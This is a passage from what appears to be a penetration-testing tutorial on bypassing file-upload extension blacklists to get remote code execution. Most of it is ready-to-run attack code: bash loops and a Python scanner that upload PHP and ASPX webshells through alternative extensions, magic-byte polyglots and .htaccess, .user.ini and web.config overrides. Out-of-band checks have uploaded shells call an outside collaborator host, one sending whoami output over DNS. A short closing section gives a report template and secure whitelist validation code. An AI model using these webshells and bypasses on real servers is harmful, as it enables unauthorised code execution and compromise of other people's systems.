      "video/mp4" "audio/mpeg" \
      "application/vnd.ms-excel" \
      "application/vnd.openxmlformats-officedocument.wordprocessingml.document"; do

      # Test with both .php and image extensions
      for ext in php jpg; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/ct_shell.txt;filename=shell.${ext};type=${ct}" \
            -H "Cookie: $COOKIE" 2>/dev/null)
          [ "$STATUS" = "200" ] && echo "[+] .${ext} + CT:${ct} ACCEPTED"
      done
  done

  # ── Combine Content-Type bypass with extension bypass ──
  echo ""
  echo "─── Combined CT + Extension bypass ───"
  for ext in phtml php5 pht phar phps; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ct_shell.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] .${ext} + CT:image/jpeg ACCEPTED"
  done

  rm -f /tmp/ct_shell.txt
  ```
  :::
::

### Category 3 — Magic Bytes + Blacklist Bypass

::tabs
  :::tabs-item{icon="i-lucide-wand" label="Magic Byte + Alternative Extension"}
  ```bash
  # ═══════════════════════════════════════════════
  # Combine magic byte forgery with blacklist bypass
  # Passes BOTH extension check AND content check
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  SHELL='<?php system($_GET["cmd"]); ?>'

  echo "═══ Magic Bytes + Blacklist Bypass ═══"

  # Create payloads with magic bytes for each alternative extension
  for ext in phtml php5 php7 pht phar phps pgif inc \
             Phtml PHP5 PHT PHAR \
             php.jpg jpg.php; do

      # JPEG magic + PHP shell
      printf '\xFF\xD8\xFF\xE0'"${SHELL}" > "/tmp/magic_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/magic_${ext};filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] JPEG magic + .${ext} ACCEPTED"

      # GIF magic + PHP shell
      echo -n "GIF89a${SHELL}" > "/tmp/magic_gif_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/magic_gif_${ext};filename=shell.${ext};type=image/gif" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] GIF magic + .${ext} ACCEPTED"

      # PNG magic + PHP shell
      printf '\x89PNG\r\n\x1a\n'"${SHELL}" > "/tmp/magic_png_${ext}"
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/magic_png_${ext};filename=shell.${ext};type=image/png" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] PNG magic + .${ext} ACCEPTED"
  done

  rm -f /tmp/magic_*
  ```
  :::

  :::tabs-item{icon="i-lucide-wand" label="Polyglot + Blacklist Bypass"}
  ```bash
  # ── Create genuine image polyglots with blacklist-bypassing extensions ──

  python3 -c "
  from PIL import Image
  import struct, io, os

  shell = b'<?php system(\$_GET[\"cmd\"]); ?>'

  # Create valid JPEG with PHP in COM segment
  img = Image.new('RGB', (100, 100), 'blue')
  buf = io.BytesIO()
  img.save(buf, 'JPEG', quality=95)
  jpg = buf.getvalue()
  com = b'\xff\xfe' + struct.pack('>H', len(shell)+2) + shell
  polyglot = jpg[:2] + com + jpg[2:]

  # Save with various blacklist-bypassing extensions
  extensions = [
      'phtml', 'php5', 'php7', 'pht', 'phar', 'phps', 'pgif',
      'inc', 'Phtml', 'PHP5', 'pHtMl', 'PHTML',
      'php.jpg', 'php.txt', 'php%00.jpg',
      'php.', 'php%20',
  ]

  os.makedirs('polyglot_bypass', exist_ok=True)
  for ext in extensions:
      path = f'polyglot_bypass/shell.{ext}'
      with open(path, 'wb') as f:
          f.write(polyglot)
      print(f'[+] {path} ({len(polyglot)} bytes)')

  # Also create GIF polyglots
  gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00'
  gif += b'\x21\xfe' + bytes([len(shell)]) + shell + b'\x00'
  gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'

  for ext in extensions:
      path = f'polyglot_bypass/gif_shell.{ext}'
      with open(path, 'wb') as f:
          f.write(gif)

  print(f'\n[+] Generated polyglots for {len(extensions)} extensions')
  " 2>/dev/null

  # Upload all polyglots
  for f in polyglot_bypass/*; do
      BASENAME=$(basename "$f")
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@${f};type=image/jpeg" -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${BASENAME} ACCEPTED"
  done
  ```
  :::
::

### Category 4 — Configuration Override

::tabs
  :::tabs-item{icon="i-lucide-file-cog" label=".htaccess Chain"}
  ```bash
  # ═══════════════════════════════════════════════
  # If .htaccess upload is not blocked:
  # Override handler → upload shell with image extension
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Stage 1: Upload .htaccess (various name attempts)
  HTACCESS_PAYLOAD='AddType application/x-httpd-php .jpg .jpeg .png .gif .txt .pdf
  php_flag engine on'

  echo "$HTACCESS_PAYLOAD" > /tmp/htaccess_payload

  for name in ".htaccess" ".Htaccess" ".HTACCESS" ".HtAcCeSs" \
              ".htaccess." ".htaccess%20"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/htaccess_payload;filename=${name}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ${name} UPLOADED"
  done

  # Stage 2: Upload shell with allowed image extension
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell_as_img.txt
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/shell_as_img.txt;filename=avatar.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # Stage 3: Verify execution
  curl -s "https://target.com/uploads/avatar.jpg?cmd=id"

  rm -f /tmp/htaccess_payload /tmp/shell_as_img.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-cog" label=".user.ini Chain"}
  ```bash
  # ═══════════════════════════════════════════════
  # .user.ini — works with Nginx+PHP-FPM
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Stage 1: Upload .user.ini
  echo 'auto_prepend_file=shell.jpg' > /tmp/user_ini
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/user_ini;filename=.user.ini;type=text/plain" \
    -H "Cookie: $COOKIE"

  # Stage 2: Upload shell as .jpg
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell_jpg
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/shell_jpg;filename=shell.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # Stage 3: Wait for .user.ini cache (up to 5 min)
  echo "[*] Waiting for .user.ini cache..."
  sleep 10

  # Stage 4: Access any .php file in the directory
  curl -s "https://target.com/uploads/index.php?cmd=id"

  # If no .php file exists, upload one
  echo '<?php ?>' > /tmp/dummy_php
  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/dummy_php;filename=info.php;type=text/plain" \
    -H "Cookie: $COOKIE"

  curl -s "https://target.com/uploads/info.php?cmd=id"

  rm -f /tmp/user_ini /tmp/shell_jpg /tmp/dummy_php
  ```
  :::

  :::tabs-item{icon="i-lucide-file-cog" label="web.config Chain (IIS)"}
  ```bash
  # ═══════════════════════════════════════════════
  # web.config — IIS handler override
  # ═══════════════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # Stage 1: Upload web.config
  cat > /tmp/web_config << 'WCEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="aspx_img" path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
      </handlers>
    </system.webServer>
  </configuration>
  WCEOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/web_config;filename=web.config;type=text/xml" \
    -H "Cookie: $COOKIE"

  # Stage 2: Upload ASPX shell as .jpg
  echo '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());%>' > /tmp/aspx_jpg

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/aspx_jpg;filename=shell.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # Stage 3: Execute
  curl -s "https://target.com/uploads/shell.jpg?cmd=whoami"

  rm -f /tmp/web_config /tmp/aspx_jpg
  ```
  :::
::

---

## Comprehensive Automated Scanner

::code-collapse
```python [blacklist_bypass_scanner.py]
#!/usr/bin/env python3
"""
Comprehensive Blacklist Filter Bypass Scanner
Tests 500+ extension variants, encoding tricks, and bypass combinations
"""
import requests
import itertools
import time
import json
import sys
import os
import urllib3
urllib3.disable_warnings()

class BlacklistBypassScanner:

    PHP_EXTENSIONS = [
        'php', 'phtml', 'php5', 'php7', 'php4', 'php3', 'php8',
        'pht', 'phps', 'phar', 'pgif', 'phtm', 'phpt', 'inc', 'module',
    ]

    ASP_EXTENSIONS = [
        'asp', 'aspx', 'ashx', 'asmx', 'asa', 'cer', 'cdx',
        'cshtml', 'vbhtml', 'ascx', 'svc', 'config',
    ]

    JSP_EXTENSIONS = ['jsp', 'jspx', 'jsw', 'jsv', 'jspf']

    OTHER_EXTENSIONS = [
        'cfm', 'cfml', 'cfc', 'pl', 'cgi', 'py', 'rb', 'sh',
        'shtml', 'stm', 'shtm', 'svg', 'html', 'htm', 'xhtml', 'hta',
    ]

    CONFIG_FILES = ['htaccess', 'htpasswd', 'user.ini', 'config']

    CONTENT_TYPES = [
        'image/jpeg', 'image/png', 'image/gif', 'application/octet-stream',
        'text/plain', 'image/bmp', 'image/webp',
    ]

    SHELLS = {
        'php': '<?php echo "BL_BYPASS_MARKER"; system($_GET["cmd"]); ?>',
        'asp': '<%eval request("cmd")%>',
        'aspx': '<%@ Page Language="C#" %><%Response.Write("BL_BYPASS_MARKER");%>',
        'jsp': '<%out.println("BL_BYPASS_MARKER");%>',
        'ssi': '<!--#exec cmd="echo BL_BYPASS_MARKER"-->',
        'xss': '<script>document.write("BL_BYPASS_MARKER")</script>',
        'config_htaccess': 'AddType application/x-httpd-php .jpg\nphp_flag engine on',
        'config_userini': 'auto_prepend_file=shell.jpg',
    }

    def __init__(self, upload_url, field="file", cookies=None, headers=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 20
        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)
        self.base_url = upload_url.rsplit('/', 2)[0]
        self.results = {'accepted': [], 'executed': [], 'config_uploaded': []}

    @staticmethod
    def case_perms(ext, max_count=16):
        """Generate case permutations (limited to avoid explosion)"""
        chars = [[c.lower(), c.upper()] if c.isalpha() else [c] for c in ext]
        perms = [''.join(p) for p in itertools.product(*chars)]
        # Return unique, skip lowercase original
        unique = list(dict.fromkeys(perms))
        return unique[:max_count]

    def get_shell_for_ext(self, ext):
        """Determine correct shell payload for extension"""
        ext_lower = ext.lower().rstrip('. \t')
        if ext_lower in ['asp', 'asa', 'cer', 'cdx']:
            return self.SHELLS['asp']
        elif ext_lower in ['aspx', 'ashx', 'asmx', 'cshtml', 'ascx', 'vbhtml']:
            return self.SHELLS['aspx']
        elif ext_lower in ['jsp', 'jspx', 'jsw', 'jsv', 'jspf']:
            return self.SHELLS['jsp']
        elif ext_lower in ['shtml', 'stm', 'shtm']:
            return self.SHELLS['ssi']
        elif ext_lower in ['html', 'htm', 'svg', 'xhtml', 'hta', 'xml']:
            return self.SHELLS['xss']
        elif ext_lower in ['htaccess', 'htpasswd']:
            return self.SHELLS['config_htaccess']
        elif ext_lower == 'user.ini':
            return self.SHELLS['config_userini']
        else:
            return self.SHELLS['php']

    def upload(self, content, filename, content_type="application/octet-stream"):
        files = {self.field: (filename, content.encode() if isinstance(content, str) else content, content_type)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=20)
            success = r.status_code in [200, 201] and any(
                w in r.text.lower() for w in ['success', 'upload', 'saved', 'url', 'path', 'file', 'created']
            ) and not any(
                w in r.text.lower() for w in ['error', 'invalid', 'denied', 'blocked', 'forbidden', 'not allowed']
            )
            return success, r.status_code, r.text
        except:
            return False, 0, ''

    def generate_all_filenames(self):
        """Generate all bypass filename variants"""
        filenames = []

        # 1. Direct alternative extensions
        all_exts = self.PHP_EXTENSIONS + self.ASP_EXTENSIONS + self.JSP_EXTENSIONS + self.OTHER_EXTENSIONS
        for ext in all_exts:
            filenames.append(('direct', f'shell.{ext}', ext))

        # 2. Case variations (top extensions only)
        priority_exts = ['php', 'phtml', 'php5', 'pht', 'phar', 'asp', 'aspx', 'ashx', 'cer', 'jsp']
        for ext in priority_exts:
            for case_ext in self.case_perms(ext, max_count=8):
                if case_ext != ext:
                    filenames.append(('case', f'shell.{case_ext}', ext))

        # 3. Double extensions
        safe_exts = ['jpg', 'png', 'gif', 'txt', 'pdf']
        exec_exts = ['php', 'phtml', 'php5', 'pht', 'asp', 'aspx', 'jsp']
        for exec_ext in exec_exts:
            for safe_ext in safe_exts:
                filenames.append(('double_exec_first', f'shell.{exec_ext}.{safe_ext}', exec_ext))
                filenames.append(('double_safe_first', f'shell.{safe_ext}.{exec_ext}', exec_ext))

        # 4. Trailing characters
        for ext in ['php', 'asp', 'aspx', 'jsp']:
            for trail in ['.', '..', '%20', '%00', '%09', '%0a']:
                filenames.append(('trailing', f'shell.{ext}{trail}', ext))

        # 5. Special: NTFS ADS, semicolons
        for ext in ['aspx', 'asp', 'php']:
            filenames.append(('ntfs_ads', f'shell.{ext}::$DATA', ext))
            filenames.append(('semicolon', f'shell.{ext};.jpg', ext))

        # 6. Null byte
        for ext in ['php', 'phtml', 'asp', 'aspx', 'jsp']:
            for safe in ['jpg', 'png', 'gif']:
                filenames.append(('nullbyte', f'shell.{ext}%00.{safe}', ext))

        # 7. Config files
        for cfg in self.CONFIG_FILES:
            filenames.append(('config', f'.{cfg}', cfg))

        return filenames

    def scan(self, delay=0.3, max_tests=None):
        """Run comprehensive blacklist bypass scan"""
        filenames = self.generate_all_filenames()
        if max_tests:
            filenames = filenames[:max_tests]

        print(f"\n{'='*60}")
        print(f" Blacklist Filter Bypass Scanner")
        print(f"{'='*60}")
        print(f"[*] Target: {self.upload_url}")
        print(f"[*] Total test cases: {len(filenames)}")
        print("-" * 60)

        tested = 0
        for category, filename, base_ext in filenames:
            tested += 1
            shell = self.get_shell_for_ext(base_ext)

            # Try with best Content-Type for the extension
            ct = 'image/jpeg' if '.' in filename and filename.rsplit('.', 1)[-1].lower() in ['jpg', 'jpeg', 'png', 'gif'] else 'application/octet-stream'

            success, status, resp = self.upload(shell, filename, ct)

            if success:
                result = {
                    'category': category,
                    'filename': filename,
                    'base_ext': base_ext,
                    'status': status,
                }
                self.results['accepted'].append(result)
                print(f"[+] ACCEPTED [{category:20s}]: {filename}")

                if category == 'config':
                    self.results['config_uploaded'].append(result)

            if tested % 50 == 0:
                print(f"[*] Progress: {tested}/{len(filenames)}")

            time.sleep(delay)

        self._report()
        return self.results

    def _report(self):
        print(f"\n{'='*60}")
        print(f" SCAN RESULTS")
        print(f"{'='*60}")
        print(f"Total accepted: {len(self.results['accepted'])}")
        print(f"Config files uploaded: {len(self.results['config_uploaded'])}")

        if self.results['accepted']:
            # Group by category
            categories = {}
            for r in self.results['accepted']:
                cat = r['category']
                if cat not in categories:
                    categories[cat] = []
                categories[cat].append(r)

            for cat, items in categories.items():
                print(f"\n  [{cat}] — {len(items)} accepted:")
                for item in items[:20]:
                    print(f"    {item['filename']}")
                if len(items) > 20:
                    print(f"    ... and {len(items)-20} more")

    def export(self, filename="blacklist_bypass_results.json"):
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[*] Results saved to {filename}")


if __name__ == "__main__":
    scanner = BlacklistBypassScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    scanner.scan(delay=0.3)
    scanner.export()
```
::

---

## Extension Execution Verification

### Confirm Uploaded Files Execute

::code-group
```bash [Verify PHP Execution]
# ── After a bypass is accepted, verify the shell executes ──

TARGET="https://target.com"

# Common upload directories
DIRS=("uploads" "Upload" "files" "media" "images" "static"
      "assets" "content" "data" "public" "storage" "tmp"
      "Uploads" "Files" "Media" "Images")

# Files to check (based on what was accepted)
FILES=("shell.phtml" "shell.php5" "shell.pht" "shell.phar" "shell.phps"
       "shell.pgif" "shell.inc" "shell.Phtml" "shell.PHP5"
       "shell.php.jpg" "shell.jpg.php" "shell.php." "shell.php%20"
       "shell.pHp" "shell.PhP" "shell.PHP")

echo "═══ Execution Verification ═══"

for dir in "${DIRS[@]}"; do
    for file in "${FILES[@]}"; do
        URL="${TARGET}/${dir}/${file}"
        RESULT=$(curl -s --max-time 5 "${URL}?cmd=echo+BLACKLIST_BYPASS_CONFIRMED" 2>/dev/null)

        if echo "$RESULT" | grep -q "BLACKLIST_BYPASS_CONFIRMED"; then
            echo "[+] RCE CONFIRMED: ${URL}"
        elif echo "$RESULT" | grep -q "BL_BYPASS_MARKER"; then
            echo "[+] PHP EXECUTED: ${URL}"
        fi
    done
done
```

```bash [Verify via OOB Callback]
# ── When direct access is blocked, use out-of-band verification ──

COLLAB="YOUR_COLLAB_ID.oastify.com"
SHELL_DIR="uploads"

# Create shell with OOB callback
for ext in phtml php5 pht phar pgif inc; do
    SHELL="<?php file_get_contents('http://${COLLAB}/bl_bypass_${ext}'); ?>"
    echo "$SHELL" > "/tmp/oob_${ext}"

    curl -s -X POST "https://target.com/api/upload" \
      -F "file=@/tmp/oob_${ext};filename=oob.${ext};type=image/jpeg" \
      -H "Cookie: session=TOKEN"

    # Try to trigger execution
    curl -s "https://target.com/${SHELL_DIR}/oob.${ext}" &>/dev/null
done

echo "[*] Check Burp Collaborator for callbacks matching 'bl_bypass_*'"

# DNS callback alternative
for ext in phtml php5 pht phar; do
    SHELL="<?php \$x=exec('whoami'); dns_get_record(\"\$x.${ext}.${COLLAB}\",DNS_A); ?>"
    echo "$SHELL" > "/tmp/dns_${ext}"
    curl -s -X POST "https://target.com/api/upload" \
      -F "file=@/tmp/dns_${ext};filename=dns.${ext}" \
      -H "Cookie: session=TOKEN"
    curl -s "https://target.com/${SHELL_DIR}/dns.${ext}" &>/dev/null
done

rm -f /tmp/oob_* /tmp/dns_*
```

```bash [Time-Based Verification]
# ── Detect execution via response time difference ──

TARGET="https://target.com"
SHELL_DIR="uploads"

for ext in phtml php5 pht phar pgif inc; do
    # Upload shell with sleep
    SHELL='<?php if(isset($_GET["s"])){sleep((int)$_GET["s"]);echo "SLEPT";} ?>'
    echo "$SHELL" > "/tmp/time_${ext}"

    curl -s -X POST "https://target.com/api/upload" \
      -F "file=@/tmp/time_${ext};filename=time_test.${ext};type=image/jpeg" \
      -H "Cookie: session=TOKEN"

    URL="${TARGET}/${SHELL_DIR}/time_test.${ext}"

    # Measure response time without sleep
    TIME_FAST=$(curl -s -o /dev/null -w "%{time_total}" --max-time 15 "${URL}?s=0" 2>/dev/null)

    # Measure response time with 5-second sleep
    TIME_SLOW=$(curl -s -o /dev/null -w "%{time_total}" --max-time 15 "${URL}?s=5" 2>/dev/null)

    # If slow request takes ~5 seconds more → PHP executed
    DIFF=$(echo "$TIME_SLOW - $TIME_FAST" | bc 2>/dev/null || echo "0")
    echo ".${ext}: fast=${TIME_FAST}s, slow=${TIME_SLOW}s, diff=${DIFF}s"

    if [ "$(echo "$DIFF > 3" | bc 2>/dev/null)" = "1" ]; then
        echo "    [+] TIME-BASED EXECUTION CONFIRMED for .${ext}!"
    fi
done

rm -f /tmp/time_*
```
::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: Forgotten Extension → Direct RCE
  ---
  1. Blacklist blocks `.php` but forgets `.phtml`
  2. Upload `shell.phtml` with PHP webshell code
  3. Access `https://target.com/uploads/shell.phtml?cmd=id`
  4. Apache mod_php handler executes `.phtml` as PHP
  5. Full Remote Code Execution achieved
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Case Variation → Blacklist Bypass → RCE
  ---
  1. Blacklist blocks `php` with case-sensitive check
  2. Upload `shell.pHp` — passes validation
  3. Apache handles `.pHp` case-insensitively → executes as PHP
  4. Full RCE through case mismatch
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Double Extension → Parser Differential → RCE
  ---
  1. Validation extracts last extension: `.jpg` → passes
  2. Apache processes first recognized extension: `.php` → executes
  3. `shell.php.jpg` passes blacklist but runs as PHP
  4. Parser differential between validation and execution
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Config Upload → Handler Override → Image Shell → RCE
  ---
  1. Blacklist doesn't block `.htaccess` (or `.user.ini`)
  2. Upload `.htaccess` with `AddType application/x-httpd-php .jpg`
  3. Upload `shell.jpg` with PHP code (passes extension check)
  4. Apache processes `.jpg` as PHP due to handler override
  5. Two-stage RCE with only "allowed" file types
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Magic Bytes + Alt Extension → Full Bypass → RCE
  ---
  1. Blacklist blocks `.php` but not `.phtml`
  2. Content validation requires valid image magic bytes
  3. Upload JPEG polyglot as `shell.phtml` with `Content-Type: image/jpeg`
  4. Passes extension blacklist (`.phtml` not blocked)
  5. Passes content validation (valid JPEG header)
  6. Apache executes as PHP → RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: IIS Semicolon → Extension Confusion → RCE
  ---
  1. Blacklist checks extension after last dot: sees `.jpg`
  2. Filename: `shell.aspx;.jpg`
  3. IIS parses semicolon as path delimiter → processes as `.aspx`
  4. ASPX shell executes on IIS server
  :::
::

---

## Reporting & Remediation

### Bug Bounty Report Template

::steps{level="4"}

#### Title
`Remote Code Execution via Blacklist Extension Bypass — .phtml Not Blocked at [endpoint]`

#### Description
The file upload endpoint at `POST /api/upload` implements a blacklist-based extension filter that blocks `.php` uploads. However, the blacklist does not include `.phtml`, which is an alternative PHP extension recognized and executed by Apache's mod_php handler. By uploading a PHP webshell with the `.phtml` extension, the validation is bypassed and the file executes as PHP on the server.

#### Root Cause
The application uses a **blacklist (deny-list) approach** for extension validation rather than the recommended **whitelist (allow-list) approach**. The blacklist is incomplete, missing the `.phtml` extension (and potentially others like `.php5`, `.pht`, `.phar`).

#### Remediation
Replace the blacklist with a strict whitelist of allowed extensions and validate against it using case-insensitive comparison after normalizing the filename.

::

### Remediation Code

::code-collapse
```python [secure_upload_examples.py]
# ═══════════════════════════════════════════
# SECURE — Whitelist-based file upload validation
# ═══════════════════════════════════════════

# ── PHP — SECURE ──
"""
<?php
// WHITELIST approach — only allow specific extensions
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf'];

// Normalize: lowercase, strip dots/spaces
$ext = strtolower(trim(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)));

if (!in_array($ext, $allowed, true)) {
    die("File type not allowed. Accepted: " . implode(', ', $allowed));
}

// Generate random filename (prevents ALL extension tricks)
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;

// Validate content matches extension
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mimes = [
    'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg',
    'png' => 'image/png', 'gif' => 'image/gif',
    'bmp' => 'image/bmp', 'webp' => 'image/webp',
    'pdf' => 'application/pdf',
];

if ($mime !== ($allowed_mimes[$ext] ?? '')) {
    die("Content does not match extension");
}

// Store outside web root or in non-executable directory
move_uploaded_file($_FILES['file']['tmp_name'], '/var/uploads/' . $new_name);
?>
"""

# ── Python (Flask) — SECURE ──
import os
import secrets
import magic

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf'}
ALLOWED_MIMES = {
    'image/jpeg', 'image/png', 'image/gif',
    'image/bmp', 'image/webp', 'application/pdf',
}
UPLOAD_DIR = '/var/uploads/'  # Outside web root
MAX_SIZE = 10 * 1024 * 1024  # 10 MB

def secure_upload(file):
    # 1. Check file size
    file.seek(0, 2)
    size = file.tell()
    file.seek(0)
    if size > MAX_SIZE:
        raise ValueError("File too large")

    # 2. Whitelist extension (case-insensitive)
    ext = os.path.splitext(file.filename)[1].lower().lstrip('.')
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension '.{ext}' not allowed")

    # 3. Validate MIME type matches extension
    mime = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    if mime not in ALLOWED_MIMES:
        raise ValueError(f"Content type '{mime}' not allowed")

    # 4. Generate random filename
    new_name = secrets.token_hex(16) + '.' + ext

    # 5. Save to non-executable directory
    file.save(os.path.join(UPLOAD_DIR, new_name))
    return new_name

# ── Key principles ──
# 1. WHITELIST, never blacklist
# 2. Case-insensitive comparison
# 3. Random filenames (prevents all extension tricks)
# 4. Content validation (MIME type matches extension)
# 5. Store outside web root
# 6. Disable execution in upload directory
```
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Unrestricted File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP comprehensive guide covering blacklist vs whitelist approaches, extension bypass techniques, and recommended defenses.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-183 — Permissive List of Allowed Inputs
  to: https://cwe.mitre.org/data/definitions/183.html
  target: _blank
  ---
  MITRE CWE entry covering incomplete deny-list validation that fails to account for all dangerous input variants.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload Bypass
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Extensive cheatsheet covering blacklist bypass techniques, alternative extensions, encoding tricks, and server-specific behaviors.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — Upload Insecure Files
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
  target: _blank
  ---
  Community-maintained payload repository with comprehensive extension lists, bypass payloads, and server-specific techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Upload Vulnerabilities
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Interactive labs covering extension blacklist bypasses, content-type manipulation, and path traversal in file uploads.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-178 — Improper Handling of Case Sensitivity
  to: https://cwe.mitre.org/data/definitions/178.html
  target: _blank
  ---
  MITRE CWE addressing case sensitivity flaws that enable extension blacklist bypasses through case variation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Apache MIME Type Configuration
  to: https://httpd.apache.org/docs/2.4/mod/mod_mime.html
  target: _blank
  ---
  Apache documentation on handler mapping, AddType, AddHandler — essential for understanding which extensions execute as code.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — File Upload Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=file%20upload%20extension%20bypass
  target: _blank
  ---
  Real-world disclosed bug bounty reports demonstrating blacklist extension bypass attacks on production applications.
  :::
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="PHP alternatives (Tier 1)" type="payload"}
  `.phtml` `.php5` `.php7` `.pht` `.phar` `.phps`
  :::

  :::field{name="PHP alternatives (Tier 2)" type="payload"}
  `.php4` `.php3` `.pgif` `.phtm` `.phpt` `.inc` `.module` `.php8`
  :::

  :::field{name="ASP/IIS alternatives" type="payload"}
  `.asp` `.ashx` `.asmx` `.asa` `.cer` `.cdx` `.cshtml` `.config`
  :::

  :::field{name="JSP alternatives" type="payload"}
  `.jspx` `.jsw` `.jsv` `.jspf`
  :::

  :::field{name="Config overrides" type="payload"}
  `.htaccess` `.user.ini` `web.config`
  :::

  :::field{name="Double extension" type="payload"}
  `shell.php.jpg` `shell.jpg.php` `shell.php.txt`
  :::

  :::field{name="Trailing chars (Windows)" type="payload"}
  `shell.php.` `shell.php%20` `shell.php::$DATA`
  :::

  :::field{name="IIS semicolon" type="payload"}
  `shell.aspx;.jpg` `shell.asp;.png`
  :::

  :::field{name="Null byte (legacy)" type="payload"}
  `shell.php%00.jpg` `shell.php%2500.jpg`
  :::

  :::field{name="Spray PHP alternatives" type="command"}
  `for e in phtml php5 pht phar phps pgif inc; do curl -s -o /dev/null -w "[%{http_code}] .${e}\n" -X POST URL -F "file=@shell.txt;filename=s.${e}"; done`
  :::

  :::field{name="Detect blacklist type" type="command"}
  Upload random extension `.xyz123` — if accepted → blacklist; if rejected → whitelist
  :::

  :::field{name="Full extension spray" type="command"}
  `python3 blacklist_bypass_scanner.py` (see scanner above)
  :::

  :::field{name="Verify execution" type="command"}
  `curl -s "https://target.com/uploads/shell.phtml?cmd=id"`
  :::
::